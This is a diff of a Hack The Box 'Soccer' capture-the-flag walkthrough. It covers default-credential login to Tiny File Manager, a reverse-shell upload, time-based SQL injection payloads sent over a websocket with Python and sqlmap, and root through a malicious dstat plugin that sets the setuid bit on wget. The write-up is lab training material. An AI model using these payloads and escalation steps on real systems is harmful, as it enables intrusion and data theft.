@@ -1,5 +1,10 @@
 # Soccer
-Let’s start with an nmap scan
+
+![Soccer](https://github.com/Wanasgheo/Writeups/assets/111740362/18fff389-6af8-416b-9414-66638fb192b2)
+
+Welcome back today we have an easy machine that has a common vulnerability to exploit in a strange way to become user, where we can learn a lot.
+
+So let's start with a usual nmap scan to get started.
 
 ```bash
 # Nmap 7.93 scan initiated Sat Jun 10 10:08:57 2023 as: nmap -sS -sC -sV -oN scans/nmap.txt 10.10.11.194
@@ -111,11 +116,7 @@ There is the `/tiny` page that we can visit where there is a login form
 
 ![Untitled(1)](https://github.com/Wanasgheo/Writeups/assets/111740362/55ae54c3-8edf-4b07-ac25-80367e30004c)
 
-By looking at the source code we can find the source code of the used framework
-
- https://github.com/prasathmani/tinyfilemanager
-
-From there we can see that there are some default credentials, that we can try to use.
+By looking at the source code we can find the  used [Framework]( https://github.com/prasathmani/tinyfilemanager) by the site, by looking for it in internet we can spot some defuault credentials that we can try 
 
 ![Untitled(2)](https://github.com/Wanasgheo/Writeups/assets/111740362/6d905f4a-bd89-49db-bfee-0de00d1eb019)
 
@@ -123,7 +124,7 @@ That could be even found by searching the version online which will redirect us 
 
 ![Untitled(3)](https://github.com/Wanasgheo/Writeups/assets/111740362/2cb93c48-951b-4486-a03a-153cdcaa2bd8)
 
-And if we try to insert them to the form we get the access
+And if we try to insert them we get the access
 
 ![Untitled(4)](https://github.com/Wanasgheo/Writeups/assets/111740362/f872245a-4d3c-42db-bf7f-5135b7fd1290)
 
@@ -131,7 +132,7 @@ Now we have to find a way to get a foothold, here its kinda easy because we just
 
 ![Untitled(5)](https://github.com/Wanasgheo/Writeups/assets/111740362/d1789e3f-e802-4d3a-8940-222df1dca472)
 
-We just have to change the directory from tiny to uploads where we can upload and open files, then we got to listen and open the revshell
+In order to get it we have to change the directory from tiny to uploads where we're allowed to manage files, then we need to listen and open the revshell
 
 ![Untitled(6)](https://github.com/Wanasgheo/Writeups/assets/111740362/e038b53f-ae66-41c5-b6e8-4f93747b9819)
 
@@ -139,13 +140,13 @@ Now we are not allowed to get the user flag, so we got to privesc to `player`
 
 ![Untitled(7)](https://github.com/Wanasgheo/Writeups/assets/111740362/c7c62776-46c4-4253-8ed5-72cbe61dbd51)
 
-From the error page we get the webserver's version which is `nginx`
+From the error page we see  the webserver's version which is `nginx`
 
 ![Untitled(8)](https://github.com/Wanasgheo/Writeups/assets/111740362/45e11fa8-159b-44be-9392-54fc150a11c8)
 
-So we can check to the root folder of it or the `/etc/nginx` where we can find some interesting stuffs.
+So we can check to the root folder of it or the `/etc/nginx` if we can find some interesting stuffs.
 
-Like from the `/etc/nginx/sites-enabled/` we can find an interesting file or `soc-player.htb`
+Like from the `/etc/nginx/sites-enabled/` where we can find an interesting file or `soc-player.htb`, a new `sub-domain`
 
 ```bash
 (remote) www-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htb 
@@ -169,19 +170,19 @@ server {
 }
 ```
 
-As you can see here seems that there is an hidden `subdomain`, so we can add it to the `/etc/hosts`, and then visit it.
+In order to visit the new sub-domain we need to add it next to the one we added before in the `/etc/hosts`.
 
 ![Untitled(9)](https://github.com/Wanasgheo/Writeups/assets/111740362/00e932c5-12f7-456b-92d5-07b7189a718b)
 
-From there we can see that we are allowed to register and then login in it.
+From there we can see that we are allowed to register and then login.
 
 ![Untitled(10)](https://github.com/Wanasgheo/Writeups/assets/111740362/839f2ae1-bab2-4b8b-9415-4783c19a8e66)
 
 We get redirected to the tickets page where we can’t do more but we can spot from  the source code that we are on a `websocket`
 
-![Untitled(11)](https://github.com/Wanasgheo/Writeups/assets/111740362/71e3150d-a9b1-41eb-8208-44a0a26d116a)
+![Untitled(29)](https://github.com/Wanasgheo/Writeups/assets/111740362/4e04a437-cb5f-4ca6-8f48-5b221c6518e7)
 
-Being in a websocket So we are on a websocket, this means that to interact with it we have to create a special code in python that let us to comunicate with it.
+Being in a websocket means that to interact with it we have to create a special code in python that let us to comunicate with it or either use burpsuite with a special request.
 
 ```python
 import asyncio
@@ -215,14 +216,14 @@ async def connect_websocket():
 asyncio.run(connect_websocket())
 ```
 
-And here is result that we get via bash
+Here we created a code in async to make it  faster but it is not necessary, and if we run it here is result that we get via bash
 
-![Untitled(12)](https://github.com/Wanasgheo/Writeups/assets/111740362/b8824698-5246-4de8-a3d7-906f703847f8)
+![image](https://github.com/Wanasgheo/Writeups/assets/111740362/9709b459-4761-4465-9c4e-bde99563ceb9)
 
 Like this we’ve established a comunication with the ws, and now we can try to check if it is vulnerable to something like the `SQL Injection`.
-After some trial and error we see that there are no error messages so we have to exploit it with time-based payloads.
+After some tests we see that there are no error messages so we have to exploit it with time-based payloads.
 
-This is the used wordlist to spot the vuln
+This is the used [wordlist](https://github.com/payloadbox/sql-injection-payload-list#generic-time-based-sql-injection-payloads) to spot the vuln
 
 ```
 sleep(5)#
@@ -321,7 +322,7 @@ OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```
 
-After this we have to change a bit the source code to make it send all the lines as input, with the goal to trigger some vuln
+After this we have to change a bit the source code to make it send all the lines as input, with the goal to trigger some vulns
 
 ```python
 import asyncio
@@ -362,37 +363,9 @@ Here is the result
 
 As you can see with the input `{"id":"sleep(5)"#}` we get the desired delay of 5 second and same for next input or `{"id":"1 or sleep(5)#"}`.
 
-Knowing this we can now use a real code that automate the work of the TimeBasedSQLi, letting us to extrafiliate informations. From these documentation of [HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection), we can even check the version of the database which is MySQL
+Now that we know it, we can try to use sqlmap to make it extract all the informations, the only problem is that we can’t simply insert the `URL` as a `POST` request, so we have two ways that we can follow.
 
-```sql
-MySQL
-#comment
--- comment     [Note the space after the double dash]
-/*comment*/
-/*! MYSQL Special SQL */
-
-PostgreSQL
---comment
-/*comment*/
-
-MSQL
---comment
-/*comment*/
-
-Oracle
---comment
-
-SQLite
---comment
-/*comment*/
-
-HQL
-HQL does not support comments
-```
-
-Now that we know it, we can try to use sqlmap to make it extract all the informations, the only problem is that we can’t simply insert the `URL` as a `POST` request, we have to ways that we can follow.
-
-We can either use only Sqlmap as the HTB Walktrough suggest, or use this code provided by a user on [github](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)
+We can either use only Sqlmap, or use this code provided by a user on [github](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)
 
 MIddleWare Server
 
@@ -457,7 +430,7 @@ except KeyboardInterrupt:
 	pass
 ```
 
-Here we change the real cookie with the one that we need or `{'id':'*'}` , like this we can run the server from a terminal and then run sqlmap from the other by useing `http://localhost:8081/?id=1` as url
+Here we change the real cookie with the one that we need or `{'id':'*'}` , like this we can run the server from a terminal and then run sqlmap from the other by using `http://localhost:8081/?id=1` as url
 
 Like this we can extract whatever we want
 
@@ -472,7 +445,7 @@ Here is the result
 ![Untitled(13)](https://github.com/Wanasgheo/Writeups/assets/111740362/11b755ed-69cf-4634-8bb8-eb8a5864f0b3)
 
 
-Instead we can only use Sqlmap by specifying the argument that we wanna pass through the request with the `--data` flag and specifying the cookie we like.
+Instead we could only use Sqlmap by specifying the argument that we want to pass through the request with the `--data` flag and specifying the cookie we like.
 
 ```python
 sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 50 --level 5 --risk 3 --batch --dump
@@ -480,7 +453,8 @@ sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 50 --
 
 Here we added:
 
-- `--thread` To specify the number of threads to use, ‘cause by default is 1, and the max is 10 so we changed it from the source code to a max o 50
+- `--thread` To specify the number of threads to use, because by default is 1, and the max is 10 so we changed it from the source code to a max o 50
+  
     ![Untitled(18)](https://github.com/Wanasgheo/Writeups/assets/111740362/517be57d-8bb0-4248-87ef-346cdb2a0420)
 
 - `--level 5` Or the max level of deepness to make it try all the possible payloads
@@ -520,17 +494,17 @@ By looking at the `doas.conf` file we can see this specifications
 
 ![Untitled(19)](https://github.com/Wanasgheo/Writeups/assets/111740362/e21a39c3-138e-4d9d-8a5c-791639fad027)
 
-Here we can see that we’re allowed to run the command `/usr/bin/dstat` as root without any password which, even it is another command that can lead to a shell if we can run it as sudo. Basically it is used to see an overview of systems in real-time.
+Here we can see that we’re allowed to run the command `/usr/bin/dstat` as root without any password which, even this, is a command that can lead to a shell if we can run it as sudo. Basically it is used to see an overview of systems in real-time.
 
-So to get the root with it we need to run it as root, In this case we can’t use `sudo` to it but we have `doas` which does the same work as it; so by looking at this [link](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/) or even [gtfobins](https://gtfobins.github.io/gtfobins/dstat/#shell), we can simply add the `s` bit to a command to become root.
+So to get the root instead of using `sudo` we will use `doas` which does the same work as it; so by looking at this [link](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/) or even [gtfobins](https://gtfobins.github.io/gtfobins/dstat/#shell), we can simply add the `s` bit to a command to become root.
 
 ![Untitled(20)](https://github.com/Wanasgheo/Writeups/assets/111740362/22249f38-3110-4f1e-b0d9-b57cc38d482c)
 
-The idea is simple we got to create a new plugin that we can insert in the `/usr/local/share/dstat` folder, where the command fetch the python files as you can see below.
+The idea is simple we got to create a new plugin that we can insert in the `/usr/local/share/dstat` folder, where the command fetch the python files, as you can see below.
 
 ![Untitled(21)](https://github.com/Wanasgheo/Writeups/assets/111740362/54f0c075-6ebd-4f19-8537-d9e76cb5e64a)
 
-So we simply have to add a python script that add the `s` bit to a command and then run it with doas
+So we simply have to create a python script that add the `s` bit to a command and then run it with doas
 
 ```bash
 echo 'import os; os.system("chmod +s /usr/bin/wget")' > /usr/local/share/dstat/dstat_giveMeRoot.py
@@ -544,7 +518,7 @@ The plugin got added so now we can run it as `root` with `doas`
 
 ![Untitled(23)](https://github.com/Wanasgheo/Writeups/assets/111740362/33c4987b-0598-431d-97bb-9dd82b81cbcc)
 
-Don’t worry about the error it worked anyway, so by checking the permission of `wget`
+Don’t worry about the error it worked anyway, as you can see  by checking the permission of `wget`
 
 ![Untitled(24)](https://github.com/Wanasgheo/Writeups/assets/111740362/22c9b103-14cc-4bd9-b716-0e43cbcd04b4)
 
@@ -552,7 +526,7 @@ So now we just have to follow the instruction of `[gtfobins](https://gtfobins.gi
 
 ![Untitled(25)](https://github.com/Wanasgheo/Writeups/assets/111740362/e341c10c-d3f8-4f44-b5fd-b57d075a14e7)
 
-By following the instructions
+By running these commands.
 
 ![Untitled(26)](https://github.com/Wanasgheo/Writeups/assets/111740362/c403ed64-b43b-44a0-a32a-21dc950d7773)
 
